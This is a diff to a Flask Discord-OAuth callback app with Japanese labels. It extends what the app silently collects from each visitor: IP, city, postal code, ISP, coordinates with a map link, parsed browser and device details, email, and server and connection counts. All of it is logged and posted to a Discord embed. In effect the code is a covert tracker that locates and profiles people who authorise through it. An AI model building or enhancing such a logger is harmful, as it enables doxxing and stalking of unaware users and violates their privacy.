@@ -1,10 +1,9 @@
-# main.py
-
 from flask import Flask, request, render_template
 import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
 from discord_bot import bot
+from user_agents import parse  # 追加
 
 load_dotenv()
 
@@ -12,7 +11,7 @@ app = Flask(__name__)
 ACCESS_LOG_FILE = "access_log.json"
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
-REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
+REDIRECT_URI = os.getenv("REDIRECT_URI")
 
 def get_client_ip():
     if "X-Forwarded-For" in request.headers:
@@ -21,19 +20,24 @@ def get_client_ip():
 
 def get_geo_info(ip):
     try:
-        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,lat,lon,proxy,hosting,query")
+        response = requests.get(f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,lat,lon,proxy,hosting,query")
         data = response.json()
         return {
             "country": data.get("country", "不明"),
             "region": data.get("regionName", "不明"),
+            "city": data.get("city", "不明"),
+            "zip": data.get("zip", "不明"),
+            "isp": data.get("isp", "不明"),
+            "as": data.get("as", "不明"),
             "lat": data.get("lat"),
             "lon": data.get("lon"),
             "proxy": data.get("proxy", False),
             "hosting": data.get("hosting", False),
             "ip": data.get("query")
         }
-    except:
-        return {"country": "不明", "region": "不明", "lat": None, "lon": None, "proxy": False, "hosting": False, "ip": ip}
+    except Exception as e:
+        print("GeoIP取得失敗:", e)
+        return {"country": "不明", "region": "不明", "city": "不明", "zip": "不明", "isp": "不明", "as": "不明", "lat": None, "lon": None, "proxy": False, "hosting": False, "ip": ip}
 
 def save_log(discord_id, data):
     logs = {}
@@ -90,7 +94,9 @@ def callback():
     if ip.startswith(("127.", "192.", "10.", "172.")):
         ip = requests.get("https://api.ipify.org").text
     geo = get_geo_info(ip)
-    user_agent = request.headers.get("User-Agent", "不明")
+
+    user_agent_str = request.headers.get("User-Agent", "不明")
+    user_agent = parse(user_agent_str)
 
     guilds = requests.get("https://discord.com/api/users/@me/guilds", headers={
         "Authorization": f"Bearer {access_token}"
@@ -122,10 +128,18 @@ def callback():
         "ip": geo["ip"],
         "country": geo["country"],
         "region": geo["region"],
+        "city": geo["city"],
+        "zip": geo["zip"],
+        "isp": geo["isp"],
+        "as": geo["as"],
         "lat": geo["lat"],
         "lon": geo["lon"],
         "map_url": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo["lat"] and geo["lon"] else "不明",
-        "user_agent": user_agent,
+        "user_agent_raw": user_agent_str,
+        "user_agent_os": user_agent.os.family + (f" {user_agent.os.version_string}" if user_agent.os.version_string else ""),
+        "user_agent_browser": user_agent.browser.family + (f" {user_agent.browser.version_string}" if user_agent.browser.version_string else ""),
+        "user_agent_device": "Mobile" if user_agent.is_mobile else "Tablet" if user_agent.is_tablet else "PC" if user_agent.is_pc else "Other",
+        "user_agent_bot": user_agent.is_bot,
         "proxy": geo["proxy"],
         "hosting": geo["hosting"],
         "guilds": guilds,
@@ -135,24 +149,30 @@ def callback():
     save_log(user["id"], data)
 
     try:
+        embed_description = (
+            f"**名前:** {data['username']}#{data['discriminator']}\n"
+            f"**ID:** {data['id']}\n"
+            f"**IP:** {data['ip']}\n"
+            f"**Proxy:** {data['proxy']} / **Hosting:** {data['hosting']}\n"
+            f"**UA:** `{data['user_agent_raw']}`\n"
+            f"**OS:** {data['user_agent_os']}\n"
+            f"**ブラウザ:** {data['user_agent_browser']}\n"
+            f"**デバイス:** {data['user_agent_device']}\n"
+            f"**Botか:** {data['user_agent_bot']}\n"
+            f"**メール:** {data['email']}\n"
+            f"**Locale:** {data['locale']}\n"
+            f"**Premium:** {data['premium_type']}\n"
+            f"**所属サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}\n"
+            f"**国:** {data['country']} / {data['region']} / {data['city']} / 郵便番号: {data['zip']}\n"
+            f"**ISP:** {data['isp']} / AS番号: {data['as']}\n"
+            f"📍 [Google Mapで場所を確認]({data['map_url']})"
+        )
+
         embed_data = {
             "title": "✅ 新しいアクセスログ",
-            "description": (
-                f"**名前:** {data['username']}#{data['discriminator']}\n"
-                f"**ID:** {data['id']}\n"
-                f"**IP:** {data['ip']}\n"
-                f"**Proxy:** {data['proxy']} / **Hosting:** {data['hosting']}\n"
-                f"**UA:** `{data['user_agent']}`\n"
-                f"**メール:** {data['email']}\n"
-                f"**Locale:** {data['locale']}\n"
-                f"**Premium:** {data['premium_type']}\n"
-                f"**所属サーバー数:** {len(guilds)} / **外部連携:** {len(connections)}"
-            ),
+            "description": embed_description,
             "thumbnail": {"url": data["avatar_url"]},
             "fields": [
-                {"name": "国", "value": data['country'], "inline": True},
-                {"name": "地域", "value": data['region'], "inline": True},
-                {"name": "📍 Google Map", "value": f"[場所を見る]({data['map_url']})", "inline": False},
                 {"name": "緯度 (Latitude)", "value": str(data['lat']) if data['lat'] else "不明", "inline": True},
                 {"name": "経度 (Longitude)", "value": str(data['lon']) if data['lon'] else "不明", "inline": True}
             ]
